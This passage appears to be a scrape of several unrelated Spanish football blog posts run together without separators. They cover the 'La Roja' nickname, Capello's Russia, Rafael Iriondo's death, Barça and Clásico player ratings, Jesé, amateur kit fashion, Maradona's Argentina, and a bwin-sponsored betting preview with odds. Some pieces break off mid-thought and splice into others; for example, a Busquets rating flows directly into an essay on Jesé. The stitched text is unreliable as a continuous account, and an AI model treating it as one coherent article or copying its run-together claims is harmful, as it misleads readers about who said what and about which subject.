Roja’ empezó a ser mareante, idóneo para titulares ridículamente chovininistas y delicioso para narraciones cargantes. Como si España, simplemente España, hubiese dejado de ser suficiente motivo para aferrarse al ideario del combinado nacional, lo de ‘La Roja’ acabó convirtiéndose en algo parecido a una marca comercial en apenas unos meses. Como maniobra de marketing, la ocurrencia del exseleccionador nacional había sido insuperable. La cosa salió bien, porque los éxitos terminaron por llegar de la mano de una generación exquisita. Y ya no hubo quien nos apeara del burro. Confieso que siento una sensación similar al rubor cada vez que escucho en televisión o radio eso de ‘La Roja’ (no digamos ya en su ridícula variante de ‘La Rojita’). Me ocurre con frecuencia ante el uso de expresiones prefabricadas y poco naturales, como extraídas de un manual y colocadas ahí en medio de la frase en un ejercicio de presunta brillantez lingüística. El aparente consenso mediático logrado sobre el sobrenombre en cuestión tampoco hace a la expresión más aceptable, porque España no nació al fútbol en el año 2006, sino que lo hizo casi un siglo antes.Y si además de todo resulta que a la selección nacional de Chile, que sí que es, ha sido y fue ‘La Roja’ desde sus inicios, le da por reclamar la titularidad del apodo de una manera tan vehemente como se ha dado en mostrar en la campaña premundialista, uno no puede sino lamentarse de que la ocurrencia sea, además, poco original. Tendrán que pasar otro puñado de décadas para que la costumbre termine dejando eso de ‘La Roja’ en su sitio de una manera natural y no forzada. Tendremos que volver a sufrir, que ver a los nuestros cayendo de nuevo en cuartos o incluso en la fase de grupos. Tendremos que volver a probar el sabor amargo de la derrota y del fracaso para que la ocurrencia de Luis Aragonés tenga cuajo y poso. Entonces, solo entonces, puede que empiece a cambiar de opinión. Quizá haya pasado algo desapercibido y es lo peor que le ha podido ocurrir. El papel de la Rusia de Fabio Capello, entrenador mejor pagado del torneo embolsándose cerca de diez millones de euros anuales, en este Mundial 2014 ha generado tan poco debate a su alrededor que uno no sabe muy bien si es porque su propuesta y puesta en escena han resultado paupérrimas o, lo que es todavía más grave, porque realmente nadie esperaba nada del combinado ruso.Rusia arrancó el torneo con un pobre empate ante Corea del Sur (1-1), tras fallo infantil de Igor Akinfeev (qué Mundial el suyo…). Cayó ante Bélgica por un gol a cero en la segunda jornada del grupo y terminó claudicando de manera bochornosa al ser incapaz de pasar del empate (1-1, de nuevo) ante una Argelia que le terminó arrebatando la segunda plaza del grupo y el consiguiente pase a octavos de final. La próxima anfitriona del torneo quedaba fuera de combate a la primera, incapaz de seguir adelante en un grupo realmente asequible.Desde fuera, y sin haber sido ni mucho menos un seguidor habitual de esta Rusia de Fabio Capello (el entrenador italiano ocupa el cargo desde el pasado verano de 2012), queda la sensación de que el camino escogido hacia la definitiva cita del 2018 no es el más apropiado. Uno observa a Capello en el banquillo ruso y ve a ese septuagenario que ha confundido la fidelidad a unos principios futbolísticos con la falta de cintura y la dificultad de adaptación a los nuevos escenarios. El fútbol ha pasado por encima de un Capello que ha perdido el aura. Lo ha adelantado por la derecha, por donde ha pillado hueco y de malas maneras, porque el viejo Fabio estorbaba en la carretera con su circular cansino y torpe.Tal vez el italiano tenía que haber sabido dar un paso a un lado hace tiempo. Admitir que el fútbol moderno demanda otras variantes, otros estilos, y que su propuesta puede que haya quedado un tanto desfasada. Sorprende que una federación del poderío económico de la rusa confíe el momento más importante de su historia futbolística, con el próximo Mundial a celebrar en suelo ruso en el horizonte, en un técnico que lleva tiempo dilapidando un palmarés que, hasta mediados de la pasada década, era exquisito. Es más, la situación de la selección rusa, saliendo por la puerta de atrás del Mundial y envuelta en las improcedentes declaraciones del propio Capello contra el arbitraje tras caer eliminado, invita a pensar en que su veterano seleccionador no cumplirá su mandato y tendrá que dejar la misión en manos de un sustituto.Rusia se fue de Brasil sin dejar nada tras de sí. Ni un par de destellos, ni un resquicio de luz al que aferrarse para construir ese futuro inmediato que está obligada a edificar. Adiós a la fantasía, adiós a la gélida genialidad tan propia de viejas generaciones rusas. La Rusia de Capello es un erial, un equipo gris, plano, más preocupado de destruir y entorpecer que de crear. Resulta aún más preocupante la escasez de talento, que ya no surge como antaño entre los principales clubes del país, empeñados en invertir los rublos en el talento extranjero en lugar de en potenciar el fútbol local. Para colmo de males, los escasos brotecillos verdes que luchan por brotar no encuentran acomodo en el secarral que plantea Capello. Alan Dzagoev, más suplente que titular con el italiano, es el vivo ejemplo. Quedan cuatro años y una Eurocopa por delante para preparar el próximo Mundial. Rusia necesita un golpe de timón y un cambio de rumbo.Puedes comprar camisetas de Rusia (¡y de la Unión Soviética o de la CIS!) en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Llueve sobre Bilbao. Es esa lluvia fina y triste, ese sirimiri tan propio del lugar que tiñe de gris plomizo el cielo del Botxo y que obliga a rememorar los años en los que la capital vizcaína no lucía brillante, verde y plateada, sino oscurecida por el color del óxido ferroso.Hoy Bilbao se ha visto obligada a mirar a ese pasado del que, de una u otra manera, todos los bilbaínos venimos. A los años de la intensa vida social y resurgir económico que siguieron a la posguerra. A los paseos en gabardina por la Gran Vía. A los años en los que la ciudad era un hervidero de gente que acudía desde otras provincias a la llamada de la industria pesada. Hoy Bilbao se ha puesto nostálgica, irremediablemente nostálgica, porque ha fallecido Rafael Iriondo, el último integrante de una delantera inolvidable.Rafa Iriondo, curtido por la vida y por la guerra desde su adolescencia, es una foto. Una icónica postal en blanco y negro que adorna las paredes de un sinfín de bares y tabernas bilbaínas en la que se le puede observar agachado junto a Venancio, Telmo Zarra, Panizo y Piru Gaínza. La inmensa mayoría de los aficionados que veneramos con respeto reverencial esa imagen nunca les vimos jugar. Nos los imaginamos corriendo por San Mamés, a esa antinatural velocidad ligeramente sobreacelerada a la que corrían las imágenes del No-Do. Imponentes figuras vestidas de corto que levantaban grandiosas estructuras sobre los ya bien musculados cimientos del Athletic Club. Iriondo, como su buen amigo Zarra y el resto de sus compañeros de aquella delantera comúnmente recitada de carrerilla, contribuyó a mitificar un club que ya generaba simpatías y respeto por todo el dolorido territorio español. Porque no hacía falta ser bilbaíno para rendirse en admiración ante el fútbol que aquel quinteto representaba. Poco a poco, ley de vida, los integrantes de aquella estampa nos han ido dejando uno tras otro. Primero se fue, en el año 1990 y quizá prematuramente, José Luis Panizo. Pocos años más tarde, nos dejaron Piru Gaínza y Venancio Pérez. En 2006, el corpachón de Telmo Zarra dijo que hasta ahí había llegado. Y ayer, justo diez años después de la muerte del mítico nueve, Rafa Iriondo volvió a reunirse con el resto la Segunda Delantera Histórica del Athletic. Dicen los más cercanos a él que en sus últimos años solía bromear con el hecho de ser el mayor de todos y, al mismo tiempo, el único superviviente de aquella delantera mágica. Socarronería autóctona y el lógico pragmatismo de quien sobrevivió al vuelo de la Legión Cóndor sobre Gernika y se vio con lo puesto siendo apenas un chaval. A ellos les debemos esa historia a la que hoy no dudamos en aferrarnos cuando vienen mal dadas y por la que sacamos pecho ufanamente. A ellos, que surgieron de aquí para dejar su mejor fútbol aquí, les debemos la abnegación del sufrido seguidor rojiblanco cuando la fe en el modelo flaquea.Hombre de fútbol, Iriondo dejó también su indeleble impronta en otros clubes. Se retiró como futbolista en la Real Sociedad y dirigió con buen tino desde el banquillo al Real Betis o al Real Zaragoza, además de al Athletic y al cuadro donostiarra.Enterró a sus cuatro compañeros y enterró también, con la emoción de un nonagenario que lo ha visto todo en la vida y que sabe que todo aquello está tocando a su fin, a San Mamés. Fue su última aparición en público como emblema viviente del Athletic. Su último acto de servicio para el club y el respetuoso epitafio de toda una afición. De los que le vieron jugar y de los que no.Se nos van las leyendas. Pero siempre nos quedará la historia. 13 – Claudio Bravo. Fichaje de perfil bajo, procedente de un equipo de media tabla y viejo conocido de la afición española. Lo tenía todo para pasar completamente desapercibido. Es más, daba la sensación de que era un parche, un portero de transición entre Valdés y su definitivo heredero universal. Pero la realidad que devuelve la competición liguera es la de un arquero sobrio, seguro, que ha ido creciendo con el paso de las jornadas y que ha contribuido, de manera notable, a que el campeón haya encajado únicamente 19 goles en 37 partidos y dejara su portería a cero en 23 choques. Uno de los últimos grandes aciertos de la secretaría técnica culé. Sobresaliente2 – Martín Montoya. Su papel en el equipo se va disipando conforme transcurren los años. Ha pasado de ser internacional absoluto a ocupar un rol prácticamente residual. Pese a todo, participó incluso más de lo que se esperaba a comienzos de temporada, cuando parecía no contar en absoluto para el técnico. No fue hasta mediada la campaña cuando comenzó a aparecer de forma esporádica en el equipo. Seis partidos como titular hablan de una posible reversión de su situación con respecto al arranque del curso. Suspenso3 – Gerard Piqué. Tras el considerable bajón del pasado curso, Piqué volvió a erigirse como el baluarte defensivo que necesitaba el equipo, despejando todas las dudas acerca de su rendimiento una vez que Carles Puyol hubo abandonado la disciplina azulgrana. Tras un comienzo de curso titubeante y arrastrando probablemente la dolorosa resaca mundialista, se convirtió en indiscutible para Luis Enrique. Protagonista del recurso del balón en largo introducido por el asturiano, su pico de forma ha coincidido precisamente con el tramo decisivo del campeonato. Sale reforzado de esta campaña. Notable14 – Javier Mascherano. Labor opaca, como de costumbre. De poco brillo y ornato, pero intocable para el técnico, que no dudó en elogiar públicamente al argentino y situarlo como referente de la plantilla por su compromiso y rendimiento. Actitud intachable, suplió como en él es costumbre la falta de corpulencia con velocidad y capacidad de anticipación. Fundamentalmente ubicado en el eje de la defensa tras la baja de larga duración de Vermaelen, actuó también en momentos puntuales como mediocentro defensivo. Su veteranía y experiencia resultaron claves en determinados trances de la temporada. Notable15 – Marc Bartra. Utilizado como cuarto central, por detrás de Piqué, Mathieu y Mascherano. A sus recientes veinticuatro años, parece que va cumpliendo con los pasos lógicos de su progresión en el que ha sido su tercer año con el primer equipo. Llegó a ser citado por Del Bosque con la selección absoluta. Buen papel como fondo de armario. Luis Enrique, que ya lo conocía de su etapa en el Barça B, no dudó en echar mano de él cuando la situación lo requirió. Aprobado18 – Jordi Alba. Superados los problemas físicos de la pasada campaña, el lateral de L’Hospitalet volvió a ofrecer la mejor de sus versiones cuando Luis Enrique lo dispuso sobre el campo. A revisar ciertos episodios que más tienen que ver con su actitud (véase la reciente expulsión del día de Cornellà) que con su rendimiento deportivo. Su rendimiento, si es que le siguen respetando las lesiones musculares como en esta campaña, aún tiene margen de crecimiento. Notable16 – Douglas Pereira. El clásico capítulo oscuro y tendente al chiste que suele incluirse en todo equipo triunfador. Su contratación fue tan rocambolesca como lo ha sido su aporte al equipo en la Liga que ya languidece. Setenta y tres minutos sobre el césped (fue titular frente al Málaga en La Rosaleda y acabó sustituido) son el perfecto resumen de su temporada. Sin trascendencia. Su futuro, parece evidente, está lejos del Camp Nou. Suspenso22 – Dani Alves. Hace un año por estas fechas parecía más fuera que dentro del club. Hoy se ha convertido en indiscutible, sensación reforzada por la sanción que impide al Barça reforzar la posición de lateral diestro hasta dentro de un año y situación aprovechada por el jugador para tensar la cuerda de su continuidad en Can Barça. Su aporte ha resultado, un año más, fundamental, alejando aquellas voces que la pasada campaña parecían ya anticipar su decadencia. Notable21 – Adriano Correia. El gran momento de Alba ha confinado al carrilero brasileño a un papel mucho más secundario que en años anteriores. Sin embargo, su buena predisposición, su polivalencia y su aceptación del rol que le tocó desempeñar le convirtieron en una pieza muy codiciada por el técnico. Ideal para la política de rotaciones del asturiano. Aprobado24 – Jérémy Mathieu. Ofrecía muchas dudas el rendimiento del francés.Su edad y el sobreprecio abonado por su traspaso al Valencia hacían plantearse interrogantes sobre la conveniencia de su incorporación. Pese a todo, y más aún tras la no comparecencia de Vermaelen, su papel ha sido decisivo en la zaga barcelonista. Fumando o no, reivindicado tras un año de regularísimo rendimiento. Dos goles jalonan su campaña. Notable4 – Ivan Rakitic. De quitarse el sombrero. Su papel era tal vez el más complicado del de todos los recién incorporados. Encajar en el centro del campo del Barça, con un Xavi en recesión y a la busca de un sustituto, no era tarea sencilla. El croata, sin embargo, termina la temporada a un nivel espectacular y plenamente asentado en el ensamblaje azulgrana. Entendió lo que el equipo quería de él y supo ofrecérselo en todo momento. Clave también en la presión y la recuperación. Cinco goles y siete asistencias en el campeonato liguero. Jugador sobre el que edificar proyectos. Sobresaliente5 – Sergio Busquets. De menos a más, ha llegado al momento decisivo de la temporada en gran estado de forma. Gran ancla del equipo en los momentos de marejada, ha sabido además mantener el tipo en el apartado disciplinario. Uno de los futbolistas a los que el equipo más echó de menos cuando no estuvo disponible por lesión. Sin Busquets, el Barça sufrió más ataques y se mostró más vulnerable. Con el de Badia en el césped, el entramado de seguridad se hizo más espeso y firme.Y, aunque no es comparable aún con Cristiano Ronaldo o Bale, desde luego no da vergüenza si comparte escenario con ellos. Cuando leo ese New Musical Express llamado Marca pienso en Portillo, Soldado, Negredo, Bueno, Palanca, Granero… todos esos artistas que no llegaron a triunfar aquí, que no vendieron lo suficiente, que grabaron discos caros que no compró casi nadie. No es que fueran malos, es que no era el momento para su música. Y temo por Jesé.Leo a Borja Barba en este mismo blog. Hablo con mis compañeros en DDF y todos coincidimos en que Jesé tiene algo especial. Todos canturreamos sus canciones al día siguiente de esa gira estelar que han sido sus últimos partidos. Tiene algo. Algo que anima a soñar. Profundidad, talento, imaginación sobre el campo. El Madrid se repliega más rápido, menos previsible. Se le ve seguro, generoso, ve gol con relativa facilidad. Pero después hojeo las revistas de música que apilo en mi cuarto de baño y pienso: ¿cuántos grupos se quedaron en el camino tras un buen primer disco? ¿no será mejor esperar al segundo disco para venderlo como The Next Big Thing? Abonado, como estoy, a la patada disimulada, al fingimiento en el área, al pelotazo arriba como resumen de la creación; es normal que mi elástica de guerra vaya más unida a la tosca maraña de Uhlsport que a la elegancia brillante de Nike. Me siento más cómodo con una pesada y mate camiseta de Legea que con las rayas de purpurina con las que Adidas remata sus prendas. Para entender el fútbol hay que ponerse en la cabeza del amigo que llama religiosamente cada semana para confeccionar dos equipos. El amigo que elige campo, que reserva pista, que recoge el dinero y que paga, disciplinado, mientras nosotros bromeamos en el vestuario y nos quitamos las botas humedecidas por el contacto salvaje con el falso césped. Ese amigo es, curiosamente y no me he equivoco, el que más conjuntado viene. Pensad en él. En sus medias a juego, el pantalón ceñido a la perfección y la última camiseta que ha sacado su equipo. O lleva el blanco merdellón con dorado que podría haber firmado Volcom, o lleva la estilizada jaula azulgrana con la que Nike dio por finiquitado su trabajo, o la por fin elegante zamarra del Athletic que nos regaló Umbro. Cosas así.Si miramos al vestuario, ese camerino del sudor y el castañear de dientes, veremos un par de jugadores vestidos de nada. Con esos modelos genéricos de Decathlon o Sprinter que son a la ropa deportiva lo que Ella Baila Sola son al Hard-Rock de los setenta. Esas camisetas que parecen confeccionadas con restos de chalecos reflectantes, con una tela que parece de disfraz de los chinos, con esos diseños a medio camino entre el corredor de mediamaratón y el profesor de gimnasia de los noventa. Y después, esquinados, orgullosos pero invisibles, estamos nosotros. Con nuestras camisetas del Nápoles, con una rareza del Bayern, con una carísima Adidas del Milan o quien sabe qué modelo que hayamos arañado de Ebay o de esta nuestra particular biblia de lo exótico.Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Volvamos al amigo que llama siempre. Alguien debe decirle que no se puede jugar al fútbol estando guapo. Que aquí, a este campo de fútbol-siete con bolitas de caucho que se meten hasta en los ojos y donde gastamos más energía yendo a por el balón que sprintando para recibir el pase al hueco de ese amigo lumbreras, no se viene a lucir prenda sino a rebañar balones. Y para eso nada mejor que suscribirse a Lotto, a Macron, a Legea, a esas marcas menores y parcas. Extrañas pero homéricamente atrayentes. Que bastante tiene con tener que perder su tiempo en llamar a cuñados tuercebotas para suplir las inesperadas bajas como para además tener que vestir de limpio. Porque cuando alguien falla un gol a puerta vacía y viste una camiseta del Bologna todos le miramos con complicidad, con ternura. Pero si alguien falla un gol a puerta vacía, si alguien comete ese error con un empate después de cincuenta minutos de pelea e insultos disimulados, y encima lleva el último modelo de setenta u ochenta euros, es entonces cuando no encontrará la más mínima acogida. Todos miraremos al suelo, mascullaremos su nombre, escupiremos lejos y pensaremos: tanta camiseta para nada.Por eso, abandónate a la vulgaridad económica de las ofertas. Descubre en tu armario un modelo del Treviso. Viste del Charlton. Los héroes del fútbol-siete no juegan en Primera. Nuestros héroes son desconocidas estrellas de las gradas altas.Si vistes como Messi el nivel de exigencia es mayor. Si vistes como Kallon, Delap o Lovenkrands el apoyo, el respeto y el cariño están asegurados.Puedes comprar todas estas camisetas y cientos más en Classic Football Shirts El celeste y el blanco. La mano de dios. Los penaltis que paró Goycoechea. Matador Kempes. La final del confeti. Un slalom de sesenta metros. Los tres errores de Palermo. Argentina es un país que tiene el fútbol inyectado en las venas. Sienten como nadie, lloran como nadie, celebran como nadie, sufren como nadie. O eso dicen ellos, y lo dicen de tal manera que uno no tiene más remedio que creerlo. Hasta han sacado a Dios del retablo y lo han puesto a servir, lo han puesto a trabajar para el hincha argentino. Maradona es la imagen de un colectivo. Ya no sólo representa la genialidad más grande que anduvo nunca por ese rectángulo de hierba, ya no es sólo el icono de una Copa levantada con pasión en el altar del Estadio Azteca. Ahora es el encargado de capitanear a un buen puñado de excelentes futbolistas, de reubicar en la galaxia a la titilante estrella albiceleste.No ha sido un camino fácil. Dios ha dejado de ser dios durante un año bizarro. Las piezas no encajaban, la esperanza de llegar a la fase final de la Copa del Mundo se diluía partido a partido. Los hombres no eran hombres y Diego naufragaba en su carácter soberbio, retador, impredecible. Inventaba sin parar, como un niño sentado en el suelo, solo, rodeado de piezas de colores con las que formar un edificio. Ese mismo edificio que una vez vio, en el 86, que recordaba de lejos en el 78. Ese bloque armado, indestructible, que se erigía majestuoso, que se podía admirar desde cualquier rincón del planeta. El partido contra Uruguay, aquel solitario gol de Bolatti, sirvió para cimentar el gelatinoso equipo de Maradona. Con la plaza asegurada en el mayor espectáculo del mundo, ya sólo quedaba crecer pieza sobre pieza. No son los mejores, llevan años rindiendo discretamente en las grandes citas, pero cuando se habla de favoritos siempre hay un lugar para un conjunto que exhala fútbol por cada centímetro de piel.La criba del técnico ha sido dura. Las ausencias brillaban casi tanto como las presencias cuando se hizo pública la lista definitiva: Gago, Lisandro, Riquelme, Banega, Cambiasso, Zanetti, Lavezzi… La apuesta de Diego no quería contentar a la afición sino definir lo que llevaba anunciando con su carácter meses atrás: Esta es la selección de Maradona. Haya éxito o fracaso, lleguen lejos o caigan pronto, este equipo es el equipo que el mister quiere. Es su capricho, su voluntad y su apuesta. Los ejercicios de soberbia van en esa línea, su encaramiento con los periodistas responden al mismo principio. Un ego como el suyo no se deja amilanar por las corrientes de opinión, las encuestas de la prensa o el discurso de cuatro expertos. Maradona conoce mejor el fútbol que el baño de su casa. Ha decidido hacer un bloque compacto, sin demasiadas florituras. Sabe que es tarde para hacer circular la pelota con clase. Es tarde para equipos elegantes, para el pase corto, la jugada colectiva. Su plan es naïf, pero consecuente. Se basa en dos argumentos inapelables en este deporte: mantener la portería a cero y marcar un gol. Los 23 seleccionados responden a esta idea tan primitiva como efectiva. Diego sabe que el balón no le corre a su equipo. Que sufren para mantener la posesión, que las coberturas defensivas son chapuceras, que su mediocampo se debate entre irse arriba o venir abajo y no termina realizando ninguna de las dos tareas. Tantos jugadores han pasado ya por el desfile de camisetas albicelestes, tantos sistemas se han dibujado en la pizarra del vestuario, que ya no se sabe a qué juega Argentina. El caótico comienzo de Diego al frente del combinado nacional, la clasificación traumática y postrera, no ha permitido el crecimiento técnico de una permanente selección nueva. Así que Maradona se ha atado los machos y ha plantado un equipo que mezcla la vulgaridad con la elegancia como si fuera un escaparate del Zara. Tan sencillo es el plan maestro de El Pelusa que ha sacrificado la posición de 10. Ni Aimar, ni Riquelme, ni la probatura de Messi por el centro. Una Argentina sin mediapunta es menos Argentina, pero para llegar lejos hay que hacer sacrificios, y este es uno de ellos.Atrás cuatro señores malencarados, defensivos y estáticos. Ni carrileros, ni laterales, ni nada que tenga que ver con cruzar la línea que marca el ecuador del campo. Solo si el frente está despejado Otamendi y Heinze saldrán de su trinchera. Demichelis y Samuel se encargaran de custodiar al buen portero del AZ, Sergio Romero. Delante de todos ellos Mascherano. Un año discreto en el Liverpool no ha mermado la confianza de Maradona en él. Diego sabe que esa bisagra tendrá buena culpa de que Argentina funcione arriba. El juego empezará por él, sin la ayuda de los costados, el arranque de las ofensivas puede convertirse en un embudo insalvable. Verón estará a su lado, posiblemente Jonás Gutierrez, que se volcará al lado derecho para intentar encontrar los espacios de Higuaín o las arrancadas de la Brujita. El de Newcastle también podrá retroceder hasta el lateral en caso de que el partido se complique, y ceder la banda a algún jugador más ofensivo. En el otro costado Di María. Incisivo, creativo, con tendencia a venirse al centro, con capacidad para dominar un espacio yermo sin las dobleces de Heinze. Y luego Messi.Tras una temporada meteórica, cargándose a las espaldas al Barcelona. Goleando, asistiendo, desbordando, confirmando que es el número uno mundial. Con estos hombres también me jugaría yo el futuro con un sistema tan arcaico. Si la portería está guarecida, ya sólo quedan los goles. Y si con Messi, Higuaín, Milito, Palermo, Tévez y Agüero no los hacen, es que este deporte no merece ser jugado.Iluminado o no, Maradona es un referente para una generación que creció con su fútbol, que sintió como propio su ocaso, y que ahora sueña con poder compartir con él su definitiva redención. Ganar una Copa del Mundo como entrenador, guiando a Argentina, es posible. El equipo sudamericano tiene el ardid, tiene jugadores para llevarla a cabo, y posee además ese intangible que hace que los futbolistas rindan por encima de sus posibilidades en situaciones como estas. Las cartas ya están sobre la mesa. Su grupo es asequible, Nigeria no está al nivel de otros años, Corea del Sur ha demostrado un pobre rendimiento en los amistos y Grecia ya demostró en la Eurocopa de hace un par de años que ni siquiera mantiene aquella solidez defensiva que le hizo tocar el cielo. Para los hinchas, y para los no hinchas, Argentina a buen nivel siempre es un aliciente futbolístico. Disfrutar de Messi, y verle conseguir con la selección las virtudes que alcanza en su club, siempre será una buena noticia para el aficionado. Esperemos que el plan de Maradona funcione, que el edificio coja altura, que se mantenga firme si soplan malos vientos. Que pueda repetir como entrenador el éxito de 1986. Que consiga regalar a los suyos un álbum de fotografías como el que él guarda en algún lugar visible de casa.Lo mejor: Messi.Sensacional en cualquier caso en el taconazo que abrió el camino para el gol de Alexis.Tello. El órdago de Guardiola mostró el descaro que le ha llevado a la primera plantilla del Barça, y suyas fueron un par de oportunidades claras que se fueron al limbo. Apenas desbordó a Arbeloa, más veterano, y da la impresión de que debe añadir más jugadas a su repertorio si quiere consolidarse en el primer equipo. Thiago. Otra apuesta personal de Pep en el partido más comprometido del año, el hijo de Mazinho sigue sin aportarle a su equipo al nivel que se le presupone por su excepcional calidad con el balón. Mostró poco empaque como centrocampista puro, perdió demasiados balones y apenas dotó de profundidad al juego. El cuerpo le pide jugar más arriba, y se nota.Messi. Encajonado entre los centrales del Madrid, Xabi y Khedira, el motor casi exclusivo del Barça en los últimos meses fue menos de lo habitual, a pesar de que intentó ejercer de medio, enganche y delantero. A pesar de esto, se inventó entre cinco rivales un maravilloso pase que dejó mano a mano a Xavi, y el gol de Alexis vino derivado de una de sus inimitables aceleraciones. Será la clave frente al Chelsea.Suplentes. Físicamente limitado, Alexis aportó un gol de pundonor poco después de salir del campo. Fábregas y Pedro apenas pudieron hacer nada.Iker Casillas. Más solvente por alto de lo habitual en esta temporada, le sacó un impresionante balón a Xavi en el primer tiempo y otro a Tello en la jugada del gol. Tampoco tuvo que parar demasiado, pero cumplió cuando se vio exigido. Buena actuación.Coentrao. Quizá el jugador para el que más significará este partido. Tras una semana muy dura, criticado sin piedad tras el partido de Munich, el lateral luso ofreció una estupenda prestación defensiva en la banda izquierda, secando a Alves hasta el punto de que el Barcelona apenas entró por ese costado en todo el partido. Por primera vez su justificó su precio.Pepe. Rápido como siempre e imperial por alto –el primer gol viene de un balón ganado por él- es inevitable no recordar su actuación de 2007 en el mismo escenario, en un partido muy parecido a éste. Además, por fin un clásico en el que no dio la nota de un modo u otro por razones extradeportivas o violentas. Su único lunar, los problemas en el desplazamiento largo.Sergio Ramos. El defensa sevillano corona la temporada en la que se ha consagrado como uno de los mejores centrales del mundo con un partido colosal en el escenario más complicado. Impecable en el corte, con la jerarquía suficiente para tirar la línea adelante cada vez que era necesario, fundamental en el carácter mostrado por el Madrid. Sólo midió mal en una ocasión, en la que pudo recibir la segunda amarilla.Arbeloa. El lateral abrió un paréntesis en una serie larga de partidos donde ha mostrado una baja forma preocupante, y mostró en el Camp Nou la solvencia y la serenidad que le han caracterizado durante su carrera. Ni Tello ni Iniesta pudieron profundizar por su banda con frecuencia, un evento fundamental en el tipo de partido que proponía Pep. Mala suerte en el rechazo del gol de Alexis.Khedira. Frecuentemente criticado por su falta de intensidad y su escasa presencia en la creación de juego, el futbolista alemán llevó a cabo con entereza la complicada labor de vigilar la zona por donde se movió sobre todo Andrés Iniesta. Más eficaz en el corte que en otros partidos, tiró de picardía para robarle la cartera a Puyol en la acción del gol. El gol del récord lleva su nombre.Xabi Alonso.El cerebro del Real Madrid brilló bastante más en el trabajo defensivo que en su especialidad, la construcción de juego. Saltaron chispas de su duelo con Messi, a quien apenas dejó recibir en buenas condiciones en zona de tres cuartos, y que “sólo” se le escapó un par de veces. A pesar del bajón físico que ha experimentado, sigue siendo fundamental en los partidazos que le quedan al equipo blanco.Di María. Puede ser que aún no este completamente recuperado de sus complicadas lesiones, pero lo cierto es que “el ángel” no ha recuperado su nivel anterior. Muy individualista en sus últimos partidos, ayer pasó desapercibido, muy pegado a la banda y poco participativo. Debe recuperar su punto de forma.Özil. No repitió su majestuosa actuación del clásico de Copa, pero sí el pase definitivo que dejó a Cristiano mano a mano con Valdés. En esta suerte, y en alguna otra, recuerda al mejor Guti. Aparte de ello, colaboró en defensa para cerrar la banda izquierda, una aportación muy destacable en un futbolista algo lagunero. Por demás, es imprescindible en este Madrid.Benzema. Seguramente no existe en el fútbol actual un delantero que sepa jugar tan bien al fútbol. El título que puede conseguir el Madrid no se entiende sin este jugador, que ayer destrozó a la zaga rival con su paso de bailarín, los pases cortos y precisos, las protecciones de balón y, sobre todo, su entendimiento de este juego. Gran partido.Cristiano. Junto con la final de Copa, su actuación más importante con la camiseta blanca. Incisivo, profundo y vertical, nada individualista, torturó a Puyol con sus sprints, definió en el gol como solía su ilustre tocayo, le anularon otro igual, y se pareció mucho, en un partido grande, a la mejor versión del mejor goleador de nuestra época. Si no pasa nada extraño, ésta será su Liga.Suplentes. Granero colaboró en enfriar el partido cuando más le convenía al Madrid, en los últimos veinte minutos.La presencia de Higuaín y Callejón quedó como testimonial. No hace tanto eran los mejores equipos de Europa. Mourinho había creado un mecano entre roca y velocidad que construía carreteras con lo que quedaba de sus rivales, mientras que Ferguson, feliz superviviente de la noche de los tiempos, completaba la fenomenal madurez de sus babes con la orfebrería brutal de Rooney y el ansia arrolladora del emergente Cristiano. Un mano a mano cósmico que acabó incluyendo siete premiers y una final de la Champions League entre shakesperiana y rompecorazones. Grandes tiempos en el puente y en el teatro.Mañana se enfrentan de nuevo, pero la sensación es bien distinta. El mismo viento de petrodólares que convocó Abramovich ha traído a los jeques a la Premier League, y muy especialmente a Mansour bin Zayed, empeñado en convertir al City en el equipo de referencia en Europa. Repleto de jugadores de clase mundial, el incómodo vecino del United goza de la condición de máximo aspirante al título liguero, y muchos pensamos que sólo la confianza desmedida en un entrenador de palo priva a los citizens de disfrutar desde ya en un puesto en la élite europea. Así las cosas, con un equipo francamente inferior al del pasado, sólo la competitividad extrema y la inercia del campeón mantienen en la lucha a los diablos rojos. Los blues hace tiempo que se alejaron de ella.Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. La lejanía del título da lugar indefectiblemente a ambientes alterados, y el runrún que hace tiempo lleva sonando alrededor de Villas-Boas no es ajeno a tal circunstancia. Ayer mismo salía en The Sun el rumor de una vuelta de Mou, y aunque la fiabilidad de la noticia es nula, sí da una indicación de cuáles son los temas de moda ahora mismo alrededor del club. El pelirrojo entrenador se ha descolgado diciendo que le cuesta mantener su autoridad en un vestuario tan curtido, y también lanzó unas declaraciones ambiguas sobre Torres en las que puede entreverse que estos partidos –con Drogba en la copa de África- pueden ser su última oportunidad; algo normal, si consideramos que el madrileño lleva doce partidos seguidos son anotar, y sus números desde que llegó a Londres son paupérrimos. Un lastre considerable, que puede tener algo que ver con la sangría blue en casa, donde vuelan los puntos como golondrinas en otoño. A este respecto, habrá quever cómo resulta el encaje de Gary Cahill en el equipo, y qué pasa al final con Terry, otra vez en el ojo del huracán. El dos veces ex-capitán de Inglaterra no jugará mañana.Algo mejor pintan las cosas para sus rivales, pero no mucho más. La inesperada eliminación en Champions ante el Basilea ha dejado caer un velo de pesimismo sobre la temporada, donde el United va acumulando partidos grises que frecuentemente gana (Stoke la semana pasada), pero que a veces se le van (la derrota en casa frente al Blackburn, por ejemplo). Más que sus méritos, le mantiene vivo la irregularidad de sus vecinos, que no acaban de dar el golpe en el mesa que se presume llegará tarde o temprano. Estos días se sigue hablando de De Gea, que ahora tiene una buena oportunidad con Lindegaard un mes fuera –hasta en esto se parece su caso al de Torres-, y también del retorno al equipo de Tom Cleverley, de vuelta tras una grave lesión de rodilla. Con Nani y Rooney también recuperados y Carrick y Valencia en especial buena forma, Ferguson podrá componer un equipo muy competitivo para saltar al Bridge. Presten atención al joven Pogba, que quizá disponga de minutos, y que encandiló a Old Trafford en su debut con el primer equipo.Incierto pronóstico para un choque tan igualado. Tanto el factor campo como el ansia de revancha aconsejan una apuesta por la victoria local (2.60 en bwin), aunque no podemos destacar ni la victoria visitante (2.65) ni un jugoso empate (2.65). Si imaginamos un contexto de pocos goles, el 1-0 al descanso se paga a 4.50, un 1-1 a 6 euros  y un 0-1 a 8.50. Y si pensamos en futbolistas, conseguiremos el triple de lo apostado si creemos que mojan Mata o Welbeck, ambos de gatillo fácil este curso, una recompensa que sube a 8 si nos fiamos de ellos como autores del último tanto. Jugosos dividendos. Por fin, Berbatov. Saliendo de titular, con Old Trafford lleno hasta la bandera, 